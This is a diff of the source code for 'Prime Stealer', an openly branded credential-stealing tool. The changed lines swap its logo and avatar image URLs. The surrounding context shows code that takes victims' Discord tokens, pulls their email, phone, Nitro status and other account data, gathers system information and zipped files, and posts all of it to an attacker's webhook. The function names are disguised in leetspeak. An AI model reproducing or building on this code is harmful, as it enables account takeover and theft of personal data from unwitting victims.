@@ -838,7 +838,7 @@ def UP104D70K3N(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
     if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+        pfp = "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -897,14 +897,14 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": "Prime Stealer | discord.gg/primestealer",
-                "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+        "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
         "username": "Prime Stealer | t.me/PrimeStealer",
         "attachments": []
         }
@@ -943,12 +943,12 @@ class PcInfo:
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | discord.gg/primestealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                        "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
             ],
             "username": "Prime Stealer | t.me/PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
             "attachments": []
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1037,12 +1037,12 @@ data = {
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | discord.gg/primestealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                        "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
             ],
             "username": "Prime Stealer | t.me/PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
             "attachments": []
             }
 L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1075,12 +1075,12 @@ def UP104D(name, link):
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | discord.gg/primestealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                        "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
             ],
             "username": "Prime Stealer | t.me/PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1101,12 +1101,12 @@ def UP104D(name, link):
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | discord.gg/primestealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                        "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
             ],
             "username": "Prime Stealer | t.me/PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1129,12 +1129,12 @@ def UP104D(name, link):
                 },
                 "footer": {
                     "text": "Prime Stealer | discord.gg/primestealer",
-                    "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                    "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                 }
                 }
             ],
             "username": "Prime Stealer | t.me/PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1314,12 +1314,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "color": color,
             "footer": {
                 "text": "Prime Stealer | discord.gg/primestealer",
-                "icon_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204"
+                "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
             }
             }
         ],
         "username": "Prime Stealer | t.me/PrimeStealer",
-        "avatar_url": "https://media.discordapp.net/attachments/1187530691429269567/1215811084162695178/prime_1.jpg?ex=65fe1b4f&is=65eba64f&hm=cb7196dc8374507a589fbd2f728aacae401dd73e5dbf0fb7ec0f5e417cb036b3&=&format=webp&width=204&height=204",
+        "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
         "attachments": []
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
